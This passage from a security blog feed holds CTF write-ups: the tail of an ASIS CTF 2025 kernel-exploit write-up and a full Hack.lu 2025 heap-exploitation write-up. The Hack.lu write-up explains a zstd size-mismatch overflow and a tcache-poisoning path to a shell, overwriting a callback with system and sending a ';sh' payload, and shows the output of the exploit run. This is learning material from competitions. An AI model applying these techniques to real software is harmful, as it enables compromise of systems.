  <span style="color:yellow">0xffffffff81e0ca50</span> - <span style="color:yellow">0xffffffff81e0ca59</span>  →   <span style="color:lightblue">"swapper/0"</span>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">tele 0xffffffff81e0ca50-0x10</span>
<span style="color:yellow">0xffffffff81e0ca40</span>│+0x0000: <span style="color:green">0xffffffff81e3bf60</span>  →  <span style="color:orange">0x0000000000000004</span>    <span style="color:gray">&lt;------ real_cred</span>
<span style="color:yellow">0xffffffff81e0ca48</span>│+0x0008: <span style="color:green">0xffffffff81e3bf60</span>  →  <span style="color:orange">0x0000000000000004</span>    <span style="color:gray">&lt;------ cred</span>
<span style="color:yellow">0xffffffff81e0ca50</span>│+0x0010: <span style="color:lightblue">"swapper/0"</span>                                  <span style="color:gray">&lt;------ comm</span>
<span style="color:yellow">0xffffffff81e0ca58</span>│+0x0018: <span style="color:orange">0x0000000000000030</span> (<span style="color:lightblue">"0"?</span>)
<span style="color:yellow">0xffffffff81e0ca60</span>│+0x0020: <span style="color:orange">0x0000000000000000</span>
</pre> <p>So, all we need to do is just call <code class="language-plaintext highlighter-rouge">commit_creds(0xffffffff81e3bf60)</code> to become root.</p> <h3 id="the-final-touches">The final touches</h3> <p>With some magic about <code class="language-plaintext highlighter-rouge">swapgs</code> and <code class="language-plaintext highlighter-rouge">iretq</code> as perfectly explained by lkmidas <a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">here</a>, all we had to do was to return to user space properly and run <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code>.</p> <p>It also turns out that the VM has a libc inside it. So we don’t need to compile the exploit statically which significantly reduces the size of the binary. Still, with some <code class="language-plaintext highlighter-rouge">gzip</code> + <code class="language-plaintext highlighter-rouge">base64</code> magic, @zolutal was able to run the exploit on the remote machine and got the flag.</p> <p>The final exploit code is available <a href="/assets/c/asis/exploit.c">here</a>. And the challenge files are available <a href="/assets/binary/asis/vuln.tar.gz">here</a>.</p> <h2 id="extra-credit">Extra Credit</h2> <p>After the CTF, I saw @kylebot and @zolutal talk about other writeups for this challenge and @kylebot mentioned that some writeup managed to use the CPU Entry Area. Apparently, there’s a special instruction called <code class="language-plaintext highlighter-rouge">sgdt</code> which can return the pointer to the randomized CPU Entry Area (thus defeating KASLR). But, on modern kernels (&lt;6.2), this instruction is not allowed because of the 11th bit in the <code class="language-plaintext highlighter-rouge">CR4</code> register called <code class="language-plaintext highlighter-rouge">UMIP</code> (User-Mode Instruction Prevention). However, this mitigation isn’t implemented in QEMU (when its using TCG) and so it can be used to leak the CPU Entry Area address. Their solution involved storing the fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> in the CPU Entry Area, followed by using the <code class="language-plaintext highlighter-rouge">sgdt</code> instruction to get the address of the fake structure which is then used to overwrite the <code class="language-plaintext highlighter-rouge">private_data</code> pointer.</p> <p>Additionally, this challenge would not panic on warnings, and so it would have been possible to just leak a kernel pointer using a warning. Maybe I’ll think of these the next time I try a kernel challenge.</p> <p>I recommend reading their writeup which is available <a href="https://kqx.io/writeups/fileno/">here</a>.</p>]]></content><author><name></name></author><category term="writeup"/><category term="ctf"/><category term="kernel"/><category term="pwn"/><summary type="html"><![CDATA[Solving the File No! challenge from ASIS CTF 2025]]></summary></entry><entry><title type="html">Hack.lu CTF 2025 UPPACKNING Writeup</title><link href="https://jkrshnmenon.github.io/blog/2025/hacklu25uppackning/" rel="alternate" type="text/html" title="Hack.lu CTF 2025 UPPACKNING Writeup"/><published>2025-09-06T15:09:00+00:00</published><updated>2025-09-06T15:09:00+00:00</updated><id>https://jkrshnmenon.github.io/blog/2025/hacklu25uppackning</id><content type="html" xml:base="https://jkrshnmenon.github.io/blog/2025/hacklu25uppackning/"><![CDATA[<p>I cannot honestly remember the last time I tried a heap pwning challenge that was actually fun. So it was very refreshing to play Hack.lu and find so many fascinating challenges. I looked at a couple of challenges, and they were all really good.</p> <p>But, I spent most of the first day of the CTF looking at this UPPACKNING challenge and so this blog post will mostly be about that.</p> <p>Let’s dive right in!</p> <h2 id="the-challenge">The challenge</h2> <p>The zip file for the challenge contains the two binaries that are involved as well as their source code. It also contains all the files for running the target in the docker environment which replicates the one deployed on the server.</p> <p>It also contains the <code class="language-plaintext highlighter-rouge">ynetd</code> binary and its source code. Essentially, this binary acts as a <code class="language-plaintext highlighter-rouge">socat</code> alternative and is only used for spinning up all the binaries needed for this challenge. So, its not really relevant to the challenge.</p> <p>Instead, the relevant binaries are <code class="language-plaintext highlighter-rouge">main</code> and <code class="language-plaintext highlighter-rouge">worker</code>. Once you connect to the server listening on port 1024, you are now communicating with the <code class="language-plaintext highlighter-rouge">main</code> binary. At the same time, a <code class="language-plaintext highlighter-rouge">worker</code> process is also spun up. This process doesn’t communicate with you directly but rather only talks to the <code class="language-plaintext highlighter-rouge">main</code> process.</p> <p>For this purpose, the <code class="language-plaintext highlighter-rouge">main</code> process connects to port 9090 which <code class="language-plaintext highlighter-rouge">ynetd</code> is accepting connections on. Once it connects to this port, <code class="language-plaintext highlighter-rouge">ynetd</code> starts up the <code class="language-plaintext highlighter-rouge">worker</code> process. And now the <code class="language-plaintext highlighter-rouge">main</code> and <code class="language-plaintext highlighter-rouge">worker</code> talk to each other over port 9090.</p> <p>To be precise, <code class="language-plaintext highlighter-rouge">main</code> only sends input to the <code class="language-plaintext highlighter-rouge">worker</code> process. The response from <code class="language-plaintext highlighter-rouge">worker</code> is handled by a <code class="language-plaintext highlighter-rouge">pthread</code> of the <code class="language-plaintext highlighter-rouge">main</code> process.</p> <p>This will be important later!</p> <p>So the <code class="language-plaintext highlighter-rouge">main</code> process spins off a thread which accepts inputs sent through the file-descriptor which is connected to the port 9090. This thread continuously loops and waits for messages on this file-descriptor. I’ll call this <code class="language-plaintext highlighter-rouge">thread #2</code></p> <p>The <code class="language-plaintext highlighter-rouge">main</code> thread (<code class="language-plaintext highlighter-rouge">thread #1</code>) listens on STDIN and offers a file-system like service where you can create/delete/list files and view/modify their contents. We are also allowed to uncompress the files which happens using a <code class="language-plaintext highlighter-rouge">Zstandard (zstd)</code> uncompression.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">enum</span> <span class="n">Commands</span> <span class="p">{</span>
    <span class="n">Create</span><span class="p">,</span>
    <span class="n">Read</span><span class="p">,</span>
    <span class="n">Write</span><span class="p">,</span>
    <span class="n">List</span><span class="p">,</span>
    <span class="n">Delete</span><span class="p">,</span>
    <span class="n">Uncompress</span><span class="p">,</span>
    <span class="n">ReadUncompressed</span><span class="p">,</span>
    <span class="n">DeleteUncompressed</span><span class="p">,</span>
    <span class="n">Exit</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></div></div> <p>The compressed and uncompressed files are kept in separate arrays. We are allowed to read from and delete the uncompressed files, but we cannot modify the uncompressed files.</p> <p>The uncompression happens in the <code class="language-plaintext highlighter-rouge">worker</code> process. When you request a file to be uncompressed, the <code class="language-plaintext highlighter-rouge">thread #1</code> in the <code class="language-plaintext highlighter-rouge">main</code> process sends the contents of the compressed file to the <code class="language-plaintext highlighter-rouge">worker</code> process. The <code class="language-plaintext highlighter-rouge">worker</code> then uncompresses the file and sends it back to <code class="language-plaintext highlighter-rouge">thread #2</code> in the <code class="language-plaintext highlighter-rouge">main</code> process which creates the uncompressed file with the new contents it received.</p> <p>This communication between the <code class="language-plaintext highlighter-rouge">main</code> process and <code class="language-plaintext highlighter-rouge">worker</code> process occurs through a custom protocol.</p> <h2 id="the-protocol">The protocol</h2> <p>The source code for this protocol is provided which resembles a hybrid between TCP and UDP. There’s a limit to the amount of data that can be sent through this protocol at a time (which is &lt;0xFD or 253). This means that larger files are split up into fragments before sending. And these fragments are reassembled upon reception.</p> <p>It resembles TCP in the sense that each fragment contains a index value which specifies the index of this fragment in the large file. It resembles UDP in the sense that the sender does not check whether the receiver has responded with an acknowledgement or not. If an error happens during transmission, the receiver simply stops receiving packets and resets it state.</p> <p>For files that are smaller than the limit, the entire file is sent as a whole. In order to differentiate between a fragmented file and a single file, the protocol uses the first byte of the data.</p> <p>A value of 0 in the first byte indicates that this data contains the entire file. Whereas a value of 1, indicates that this data is a fragment of a larger file.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Receiver side</span>
<span class="kt">void</span> <span class="nf">packetio_frame_receive</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">frame</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">PacketIO_t</span> <span class="o">*</span><span class="n">packet_io</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">frame</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">Single</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">receive_frame_single</span><span class="p">(</span><span class="n">frame</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">packet_io</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">frame</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">Fragmented</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">receive_frame_fragmented</span><span class="p">(</span><span class="n">frame</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">packet_io</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="c1">// Sender side</span>
<span class="kt">void</span> <span class="nf">send_fragment_single</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fragment</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">PacketIO_t</span> <span class="o">*</span><span class="n">packet_io</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>
    <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">Single</span><span class="p">;</span>
  <span class="p">...</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="kt">void</span> <span class="nf">send_fragment_fragmented</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fragment</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">PacketIO_t</span> <span class="o">*</span><span class="n">packet_io</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>
            <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">Fragmented</span><span class="p">;</span>
  <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div> <p>If the data being sent is a fragment of a file, the second byte of the data indicates the index of this fragment. When the first fragment is being sent, this byte contains the total number of fragments that are expected.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Receiver side</span>
<span class="kt">void</span> <span class="nf">receive_frame_fragmented</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">frame</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">PacketIO_t</span> <span class="o">*</span><span class="n">packet_io</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">n_fragments</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">n_fragments</span> <span class="o">=</span> <span class="n">frame</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>  <span class="o">&lt;-------</span> <span class="n">Byte</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">1</span> <span class="n">indicates</span> <span class="n">total</span> <span class="n">number</span> <span class="n">of</span> <span class="n">frames</span>
    <span class="p">...</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="c1">// Sender side</span>
<span class="kt">void</span> <span class="n">send_fragment_fragmented</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fragment</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">PacketIO_t</span> <span class="o">*</span><span class="n">packet_io</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>
            <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">Fragmented</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_first_fragment</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_n_fragments</span><span class="p">;</span>  <span class="o">&lt;---------</span> <span class="n">Set</span> <span class="n">here</span>
                <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_first_fragment</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="p">}</span>
  <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div> <p>Once the first frame of a fragment has been sent, the next frame will contain frame indices starting from 0. The sender and receiver keep track of the total number of frames sent and they will stop when their counter becomes equal to <code class="language-plaintext highlighter-rouge">total_frames - 1</code> (or <code class="language-plaintext highlighter-rouge">total_frames - 2</code> in the case of the receiver).</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Receiver side</span>
<span class="kt">void</span> <span class="nf">receive_frame_fragmented</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">frame</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">PacketIO_t</span> <span class="o">*</span><span class="n">packet_io</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>
        <span class="kt">int</span> <span class="n">last</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">fragment_index</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">n_fragments</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">last</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">n_fragments</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
  <span class="p">...</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="c1">// Sender side</span>
<span class="kt">void</span> <span class="nf">send_fragment_fragmented</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fragment</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">PacketIO_t</span> <span class="o">*</span><span class="n">packet_io</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_fragment_index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_n_fragments</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_n_fragments</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
  <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div> <p>That pretty much sums up the important parts of the protocol.</p> <p>Only thing left to do is to find the vuln, pwn and <code class="language-plaintext highlighter-rouge">cat flag</code>.</p> <h2 id="the-vulnerability">The vulnerability</h2> <p>Since the organizers provided the source code for this challenge, you’d think finding the vulnerability would be easy.</p> <p>To be fair, Claude was able to find a buffer-overread when you read from an uncompressed file very quickly. This could be useful for memory leaks.</p> <p>However, it took @zolutal and I around 12 hours to find a memory corruption bug. During that time, we came up with so many theories on what the vulnerability could be. In fact, we were convinced that it had to be a race-condition vulnerability.</p> <p>At one point, I was absolutely certain that the vulnerability had to occur when the receiver was calculating <code class="language-plaintext highlighter-rouge">packet_io-&gt;fragment_index + 2</code> since <code class="language-plaintext highlighter-rouge">fragment_index</code> was a <code class="language-plaintext highlighter-rouge">uint8_t</code> which would lead to an integer overflow.</p> <p>However, this was not happening since the <code class="language-plaintext highlighter-rouge">uint8_t</code> was promoted to a 32 bit integer before the addition.</p> <p>I was so full of myself and asked the organizers if there was a mistake in the challenge since no one had pwned it at that point. That was a very dumb move on my part.</p> <p>However, after many more hours of talking to Claude and brainstorming possibilities, I finally found the bug.</p> <p>So, when a file is being uncompressed, the <code class="language-plaintext highlighter-rouge">worker</code> uses a function <code class="language-plaintext highlighter-rouge">ZSTD_getFrameContentSize</code> to calculate how big the uncompressed file will be. As it turns out, you can just lie about the total size in the header of a compressed file and this function will happily return this fake value. And the actual uncompression (decompression?) can create a buffer with a smaller length.</p> <p>Now, this fake size value returned by <code class="language-plaintext highlighter-rouge">ZSTD_getFrameContentSize</code> is used by the sender to calculate the number of fragments to be sent. This total number of fragments value goes in the second byte of the first frame sent.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">packetio_fragment_init</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">max_len</span><span class="p">,</span> <span class="n">PacketIO_t</span> <span class="o">*</span><span class="n">packet_io</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">max_len</span> <span class="o">&gt;</span> <span class="n">MAX_FRAGMENTS</span> <span class="o">*</span> <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">max_fragment_data</span><span class="p">)</span> <span class="p">{</span>    <span class="c1">// MAX_FRAGMENTS = 255</span>
        <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_n_fragments</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                             <span class="c1">// max_fragment_data = 253</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_n_fragments</span> <span class="o">=</span> <span class="p">(</span><span class="n">max_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">max_fragment_data</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>However, once the sender start sending the frames, it uses the length of the buffer actually generated by the uncompression done by <code class="language-plaintext highlighter-rouge">ZSTD_decompressStream</code>. The sender stops sending any new frames when the total number of bytes it has sent becomes equal to the total number of bytes generated by the uncompression.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kt">void</span> <span class="nf">send_fragment_fragmented</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fragment</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">PacketIO_t</span> <span class="o">*</span><span class="n">packet_io</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">len</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">uint64_t</span> <span class="n">copy_len</span> <span class="o">=</span> <span class="n">MIN</span><span class="p">(</span><span class="n">len</span><span class="p">,</span> <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">max_fragment_data</span> <span class="o">-</span> <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_buf_index</span><span class="p">);</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_buf</span> <span class="o">+</span> <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_buf_index</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">fragment</span><span class="p">,</span> <span class="n">copy_len</span><span class="p">);</span>
        <span class="n">packet_io</span><span class="o">-&gt;</span><span class="n">send_buf_index</span> <span class="o">+=</span> <span class="n">copy_len</span><span class="p">;</span>
        <span class="n">fragment</span> <span class="o">+=</span> <span class="n">copy_len</span><span class="p">;</span>
        <span class="n">len</span> <span class="o">-=</span> <span class="n">copy_len</span><span class="p">;</span>
        <span class="p">...</span>
    <span class="p">}</span>
  <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div> <p>What this effectively means is that the sender can initially tell the receiver to expect N frames, but then only go on to send M frames where <code class="language-plaintext highlighter-rouge">M&lt;N</code>.</p> <p>Since the receiver doesn’t know that the sender has stopped sending frames, it will continue to wait for the <code class="language-plaintext highlighter-rouge">M+1</code> frame to arrive.</p> <p>At this point, if we send another file to be uncompressed, the sender will restart its process of calculating fragments and send the first frame of this new file with the new total number of fragments <code class="language-plaintext highlighter-rouge">P</code>.</p> <p>Now, the receiver is expecting a value of <code class="language-plaintext highlighter-rouge">M+1</code> in the frame index (byte offset 1), but it sees a frame with a value <code class="language-plaintext highlighter-rouge">P</code>. If <code class="language-plaintext highlighter-rouge">P != M+1</code>, this doesn’t follow the expected frame index and so the receiver resets its state after dropping this frame.</p> <p>The sender however, goes on to send the next frame (which starts at index 0). When the receiver sees this frame, it assumes that the byte at offset 1 contains the total number of expected fragments which in this case is 0.</p> <p>The receiver then allocates a buffer of size 0 to hold this frame (of length 0xFD) and then copies the first frame into this buffer. And boom! There’s our memory corruption.</p> <p>It took me a little bit of time, trying to coax ChatGPT to give me a python script that generated a <code class="language-plaintext highlighter-rouge">zstd</code> compressed input which satisfies my requirements. And also some time to debug this multi-binary setup. But, around midnight, I had a Proof-of-Concept which replicates this buffer-overflow.</p> <p>About time!!</p> <h2 id="the-exploit">The exploit</h2> <p>So far, we had a memory read and a memory write on the heap. And so we figured, it’d be an easy solve from this point onwards, right ? Thinking this, we passed off this challenge to one of the newer CTF members @Sammy.</p> <p>However, there were quite a few more complications required to finish the exploit.</p> <p>Since in this challenge, the <code class="language-plaintext highlighter-rouge">thread #1</code> which allowed users to create compressed files was using <code class="language-plaintext highlighter-rouge">calloc</code> which does not use the <code class="language-plaintext highlighter-rouge">tcache</code>. However, <code class="language-plaintext highlighter-rouge">thread #2</code> does use <code class="language-plaintext highlighter-rouge">malloc</code>, but it never free’s anything. All the deletion of compressed and uncompressed files happens within <code class="language-plaintext highlighter-rouge">thread #1</code>. Any pointer allocated by <code class="language-plaintext highlighter-rouge">thread #2</code> was going into the <code class="language-plaintext highlighter-rouge">tcache</code> of <code class="language-plaintext highlighter-rouge">thread #1</code> when it was freeing this pointer.</p> <p>To summarize, in <code class="language-plaintext highlighter-rouge">thread #1</code>, we could not retrieve anything from the <code class="language-plaintext highlighter-rouge">tcache</code>. And in <code class="language-plaintext highlighter-rouge">thread #2</code>, we could not push more than one chunk into the <code class="language-plaintext highlighter-rouge">tcache</code> for each bin.</p> <p>Unfortunately, we could not finish this challenge during the CTF. And so I spent my Sunday evening working on it.</p> <p>I thought that the way to exploit this challenge would be to use <code class="language-plaintext highlighter-rouge">fastbins</code> and then fake a chunk in the stack which would allow me to get a ROP chain working. Since, you need to ensure that the FD of the fake chunk you’re trying to allocate is valid, you’re restricted to only allocating fake chunks on locations where you control at least 13 bytes. And one of the locations that you could control was the stack of the function that reads from the file descriptors. In fact, I found that the offset from the heap base of <code class="language-plaintext highlighter-rouge">thread #2</code> to its stack had only 16 bits that were changing. So it could potentially be brute-forced in 65,536 attempts. Which is not too bad.</p> <p>So I went down this rabbit hole of trying to get a <code class="language-plaintext highlighter-rouge">fastbin</code> in the stack of <code class="language-plaintext highlighter-rouge">thread #2</code>. After many hours, I had finally achieved my goal and had leaked the stack canary and could not overwrite the saved RIP of <code class="language-plaintext highlighter-rouge">thread #2</code>.</p> <p>At this point, I realized the importance of planning ahead when I found that <code class="language-plaintext highlighter-rouge">thread #2</code> was never returning from its loop of waiting for new messages. Even though <code class="language-plaintext highlighter-rouge">thread #1</code> had the option to exit, <code class="language-plaintext highlighter-rouge">thread #2</code> would just continue looping until its killed by the OS. This meant that my effort was wasted and I would never be able to trigger my ROP chain.</p> <h2 id="the-better-exploit">The better exploit</h2> <p>After I spent some amount of time reading the source code of <code class="language-plaintext highlighter-rouge">malloc</code>(which had changed quite a bit from the last time I read it, which was around 2020 or so), I realized that <code class="language-plaintext highlighter-rouge">fastbins</code> would be converted to <code class="language-plaintext highlighter-rouge">tcache</code> entries if their sizes matched.</p> <p>So, if I had filled up the <code class="language-plaintext highlighter-rouge">tcache</code> bin in <code class="language-plaintext highlighter-rouge">thread #1</code> with 7 chunks and had 3 chunks in its <code class="language-plaintext highlighter-rouge">fastbin</code>, the next call to <code class="language-plaintext highlighter-rouge">malloc</code> would move those three <code class="language-plaintext highlighter-rouge">fastbin</code> chunks into the <code class="language-plaintext highlighter-rouge">tcache</code> of <code class="language-plaintext highlighter-rouge">thread #2</code>.</p> <p>With <code class="language-plaintext highlighter-rouge">tcache</code>, since we’re no longer constrained by the 13 controllable bytes requirement, I proceeded to allocate a fake chunk over the compressed file array. With this array, I could now arbitrarily read from any address since I controlled the <code class="language-plaintext highlighter-rouge">data</code> and <code class="language-plaintext highlighter-rouge">size</code> values for each file.</p> <p>And from there, all I needed to do was to overwrite one of the function pointers which was being used as a callback by the protocol and change its value to <code class="language-plaintext highlighter-rouge">system</code> and request compressing a file that contained <code class="language-plaintext highlighter-rouge">;sh\x00</code> as its contents.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ❯ python exploit.py
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/tmp/chall/main'</span>
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b<span class="s1">'.'</span>
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/tmp/chall/libc.so.6'</span>
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
<span class="o">[</span>+] Opening connection to localhost on port 1024: Done
<span class="nv">$ </span><span class="nb">ls
</span>flag
ld-linux-x86-64.so.2
libc.so.6
main
ynetd
<span class="nv">$ </span><span class="nb">cat </span>flag
flag<span class="o">{</span><span class="k">**********</span><span class="o">}</span>
<span class="nv">$ </span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed connection to localhost port 1024
</code></pre></div></div> <p>Overall, this was a fun challenge and I really enjoyed solving it. As well as the other challenges from this CTF.</p> <p>The files for this challenge are available <a href="/assets/binary/hack.lu/UPPACKNING.zip">here</a>.</p> <p>And my exploit script is <a href="/assets/python/hack.lu/exploit.py">here</a>.</p> <h2 id="extra-credit">Extra Credit</h2> <p>Since I never got to try out the brute-force approach of guessing the <code class="language-plaintext highlighter-rouge">pthread</code> stack base from its heap address, I wanted to give it a shot and see whether or not it was actually possible.</p> <p>And to test it, I created a simple C program that would allocate a heap pointer and a stack buffer and print out the start address of their respective segments by reading from <code class="language-plaintext highlighter-rouge">/proc/self/maps</code>.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span><span class="o">*</span> <span class="nf">thread_func</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"malloc"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">uint64_t</span> <span class="n">stack_start</span> <span class="o">=</span> <span class="n">find_mapping_start</span><span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">heap_start</span> <span class="o">=</span> <span class="n">find_mapping_start</span><span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">p</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%#lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">stack_start</span> <span class="o">-</span> <span class="n">heap_start</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
